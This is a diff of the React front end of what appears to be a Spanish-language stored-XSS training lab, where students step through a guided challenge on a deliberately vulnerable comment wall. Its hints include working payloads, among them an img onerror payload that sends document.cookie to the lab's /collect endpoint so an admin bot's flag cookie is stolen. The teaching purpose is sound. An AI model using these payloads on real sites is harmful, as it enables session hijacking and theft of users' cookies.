@@ -1,7 +1,6 @@
 import React, { useEffect, useRef, useState } from 'react';
 
 // Convierte el nombre del alumno en un identificador de sala seguro.
-// "Ana Pérez" -> "ana-perez". El backend aplica el mismo saneo a la sala.
 function slugify(name) {
   return name
     .trim()
@@ -10,15 +9,12 @@ function slugify(name) {
     .replace(/[^a-z0-9_-]/g, '');
 }
 
-// La sala viene de ?room= en la URL. Si no hay, mostramos el login.
 function getRoom() {
   const p = new URLSearchParams(window.location.search);
   return (p.get('room') || '').trim();
 }
 
 function cerrarSesion() {
-  // No hay estado de sesión que limpiar: la "sala" vive en la URL.
-  // Volver al login es ir a / sin ?room=.
   window.location.href = '/';
 }
 
@@ -29,7 +25,7 @@ const Banner = () => (
   </div>
 );
 
-// --- Vista de login: el alumno escribe su nombre y entra a su sala ---
+// --- Login: el alumno escribe su nombre y entra a su sala ---
 function Login() {
   const [name, setName] = useState('');
   const slug = slugify(name);
@@ -68,86 +64,119 @@ function Login() {
   );
 }
 
-// --- Guía dinámica: detecta el progreso real del alumno ---
-function Guia({ room, tieneComentarios, flag, esperando }) {
-  const pasos = [
+// Definición de las etapas del reto. `key` coincide con el campo de /status.
+function etapasDef(room) {
+  return [
     {
-      titulo: 'Publica un comentario con un payload',
-      detalle: 'Usa el botón de abajo para insertar un ejemplo, o escribe el tuyo y pulsa "Publicar comentario".',
-      hecho: tieneComentarios
+      key: 'hasComments',
+      titulo: 'Reconoce el muro',
+      objetivo:
+        'Escribe cualquier texto y pulsa "Publicar comentario". Observa que aparece abajo en "Comentarios publicados". Así funciona la entrada de datos que vas a atacar.',
+      pista: 'Publica un mensaje normal, por ejemplo: hola mundo',
+      ejemplo: 'hola mundo'
     },
     {
-      titulo: 'Espera a que el admin visite tu sala',
-      detalle: 'Un bot "admin" entra a tu sala cada ~10 s. Al cargar tu comentario, el payload corre en su sesión y envía su cookie.',
-      hecho: !!flag,
-      activo: tieneComentarios && !flag
+      key: 'htmlInjected',
+      titulo: '¿El muro sanitiza? Inyecta HTML',
+      objetivo:
+        'Comprueba si el muro interpreta HTML en vez de mostrarlo como texto plano. Publica un comentario con una etiqueta de formato y mira si cambia la apariencia. Si cambia, el muro NO sanitiza: es vulnerable.',
+      pista: 'Prueba una etiqueta de formato como un encabezado o negrita.',
+      ejemplo: '<h3>esto es HTML</h3>'
     },
     {
-      titulo: 'Captura la flag robada',
-      detalle: flag
-        ? 'Listo: tu payload robó la cookie del admin.'
-        : 'Cuando el bot ejecute tu payload, aquí aparecerá la flag capturada.',
-      hecho: !!flag
+      key: 'scriptTried',
+      titulo: 'Prueba <script> (y entiende por qué NO corre)',
+      objetivo:
+        'El payload "obvio" es una etiqueta <script>. Pruébalo. Verás que NO se ejecuta: cuando el HTML se inserta con innerHTML (como hace esta app), el navegador no corre las etiquetas <script> añadidas así. Lección clave antes de seguir.',
+      pista: 'Publica un <script> con un alert y comprueba que no pasa nada.',
+      ejemplo: "<script>alert('xss')</script>"
+    },
+    {
+      key: 'jsExecuted',
+      titulo: 'Ejecuta JS con un manejador de eventos',
+      objetivo:
+        'Si <script> no corre, usa un atributo de evento. Una imagen con una fuente inválida dispara su onerror, y ahí SÍ se ejecuta tu JavaScript. Haz que llame al "beacon" del lab para demostrar la ejecución.',
+      pista: `Imagen rota que dispara onerror hacia /beacon de tu sala.`,
+      ejemplo: `<img src=x onerror="fetch('/beacon?room=${room}')">`
+    },
+    {
+      key: 'cookieCaptured',
+      titulo: 'Roba una cookie',
+      objetivo:
+        'Ya ejecutas JS. Ahora envía document.cookie al buzón /collect. OJO: capturarás TU cookie de invitado (session=invitado), NO la flag. La flag no vive en tu sesión... ¿en la de quién vivirá?',
+      pista: 'Cambia el beacon por /collect y adjunta document.cookie.',
+      ejemplo: `<img src=x onerror="fetch('/collect?room=${room}&c='+document.cookie)">`
+    },
+    {
+      key: 'flagCaptured',
+      titulo: 'XSS almacenado: roba la cookie del ADMIN',
+      objetivo:
+        'La flag está en la cookie de un "admin". Como tu comentario quedó ALMACENADO, un bot admin lo cargará cada ~10 s y tu payload correrá en SU sesión, enviando SU cookie (con la flag) a /collect. No necesitas otro payload: deja publicado el de la etapa 5 y espera.',
+      pista: 'No publiques nada nuevo. Solo espera al bot admin (~10-15 s).',
+      ejemplo: null
     }
   ];
+}
+
+// --- Una etapa de la guía ---
+function Etapa({ n, def, estado, activa, onInsertar }) {
+  const [verPista, setVerPista] = useState(false);
+  const clase = estado === 'done' ? 'done' : activa ? 'activa' : 'bloqueada';
 
   return (
-    <div className="pasos">
-      <h2>Guía paso a paso</h2>
-      <ol>
-        {pasos.map((p, i) => (
-          <li key={i} className={`paso ${p.hecho ? 'done' : ''} ${p.activo ? 'activo' : ''}`}>
-            <span className="paso-num">{p.hecho ? '✓' : i + 1}</span>
-            <div className="paso-txt">
-              <div className="paso-titulo">
-                {p.titulo}
-                {p.activo && esperando && <span className="esperando"> · esperando al bot…</span>}
+    <li className={`etapa ${clase}`}>
+      <span className="etapa-num">{estado === 'done' ? '✓' : n}</span>
+      <div className="etapa-cuerpo">
+        <div className="etapa-titulo">{def.titulo}</div>
+        {(activa || estado === 'done') && <div className="etapa-objetivo">{def.objetivo}</div>}
+
+        {activa && (
+          <div className="etapa-acciones">
+            <button className="btn-pista" type="button" onClick={() => setVerPista((v) => !v)}>
+              {verPista ? 'Ocultar pista' : 'Ver pista'}
+            </button>
+            {verPista && (
+              <div className="pista">
+                <p>{def.pista}</p>
+                {def.ejemplo && (
+                  <>
+                    <code className="pista-codigo">{def.ejemplo}</code>
+                    <button
+                      className="btn-sec"
+                      type="button"
+                      onClick={() => onInsertar(def.ejemplo)}
+                    >
+                      Insertar en el cuadro
+                    </button>
+                  </>
+                )}
               </div>
-              <div className="paso-detalle">{p.detalle}</div>
-              {i === 2 && flag && (
-                <div className="flag-box">
-                  🚩 <code>{flag}</code>
-                </div>
-              )}
-            </div>
-          </li>
-        ))}
-      </ol>
-    </div>
+            )}
+          </div>
+        )}
+      </div>
+    </li>
   );
 }
 
-// --- Vista del muro: comentarios de la sala del alumno ---
+// --- Muro + reto guiado ---
 function Board({ room }) {
   const [text, setText] = useState('');
   const [comments, setComments] = useState([]);
   const [loading, setLoading] = useState(false);
-  const [flag, setFlag] = useState('');
-  const flagRef = useRef('');
+  const [status, setStatus] = useState({});
+  const taRef = useRef(null);
 
-  // Payload de ejemplo para principiantes, ya con su sala.
-  const ejemplo = `<img src=x onerror="fetch('/collect?room=${room}&c='+document.cookie)">`;
+  const etapas = etapasDef(room);
 
   async function load() {
     try {
-      const res = await fetch(`/api/comments?room=${encodeURIComponent(room)}`);
-      setComments(await res.json());
-    } catch (e) {
-      /* sin conexión: dejamos la lista como está */
-    }
-  }
-
-  // Revisa el botín (/loot) y, si aparece una flag, avanza la guía.
-  async function checkLoot() {
-    if (flagRef.current) return;
-    try {
-      const res = await fetch(`/loot?room=${encodeURIComponent(room)}`);
-      const t = await res.text();
-      const m = t.match(/FLAG\{[^}]*\}/);
-      if (m) {
-        flagRef.current = m[0];
-        setFlag(m[0]);
-      }
+      const [c, s] = await Promise.all([
+        fetch(`/api/comments?room=${encodeURIComponent(room)}`).then((r) => r.json()),
+        fetch(`/status?room=${encodeURIComponent(room)}`).then((r) => r.json())
+      ]);
+      setComments(c);
+      setStatus(s);
     } catch (e) {
       /* reintenta en el próximo tick */
     }
@@ -155,12 +184,7 @@ function Board({ room }) {
 
   useEffect(() => {
     load();
-    checkLoot();
-    // Polling dinámico: mientras no haya flag, revisa comentarios y botín.
-    const id = setInterval(() => {
-      load();
-      checkLoot();
-    }, 4000);
+    const id = setInterval(load, 3000);
     return () => clearInterval(id);
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
@@ -181,7 +205,15 @@ function Board({ room }) {
     }
   }
 
-  const esperando = comments.length > 0 && !flag;
+  function insertar(ejemplo) {
+    setText(ejemplo);
+    if (taRef.current) taRef.current.focus();
+  }
+
+  // Índice de la primera etapa no completada.
+  const activaIdx = etapas.findIndex((e) => !status[e.key]);
+  const completadas = etapas.filter((e) => status[e.key]).length;
+  const flag = status.flag;
 
   return (
     <div className="wrap">
@@ -192,32 +224,60 @@ function Board({ room }) {
         <button className="btn-salir" onClick={cerrarSesion}>Cerrar sesión</button>
       </div>
       <p className="hint">
-        Estás en tu sala <strong>{room}</strong>. Solo ves los comentarios de esta sala.
+        Estás en tu sala <strong>{room}</strong>. Resuelve el reto paso a paso: la guía detecta
+        sola cada logro.
       </p>
 
-      <Guia room={room} tieneComentarios={comments.length > 0} flag={flag} esperando={esperando} />
+      <div className="reto">
+        <div className="reto-head">
+          <h2>Reto guiado</h2>
+          <span className="progreso">{completadas}/{etapas.length} etapas</span>
+        </div>
+
+        {flag && (
+          <div className="exito">
+            🎉 ¡Flag capturada! <code>{flag}</code>
+          </div>
+        )}
+
+        <ol className="etapas">
+          {etapas.map((def, i) => (
+            <Etapa
+              key={def.key}
+              n={i + 1}
+              def={def}
+              estado={status[def.key] ? 'done' : 'pendiente'}
+              activa={i === activaIdx}
+              onInsertar={insertar}
+            />
+          ))}
+        </ol>
+
+        {activaIdx === 4 && status.cookieCaptured && !flag && (
+          <p className="esperando">Cookie capturada. Esperando a que el bot admin cargue tu comentario…</p>
+        )}
+        {activaIdx === 5 && !flag && (
+          <p className="esperando">Esperando al bot admin (~10-15 s)…</p>
+        )}
+      </div>
 
       <textarea
+        ref={taRef}
         className="caja"
         placeholder="Escribe tu comentario aquí..."
         value={text}
         onChange={(e) => setText(e.target.value)}
-        rows={5}
+        rows={4}
       />
       <div className="acciones">
         <button className="btn-azul" onClick={publicar} disabled={loading}>
           Publicar comentario
         </button>
-        <button className="btn-sec" type="button" onClick={() => setText(ejemplo)}>
-          Insertar payload de ejemplo
-        </button>
       </div>
 
       <h2>Comentarios publicados</h2>
       <div className="lista">
-        {comments.length === 0 && (
-          <p className="vacio">Aún no hay comentarios en esta sala.</p>
-        )}
+        {comments.length === 0 && <p className="vacio">Aún no hay comentarios en esta sala.</p>}
         {comments.map((c, i) => (
           <div className="comentario" key={i}>
             {/*
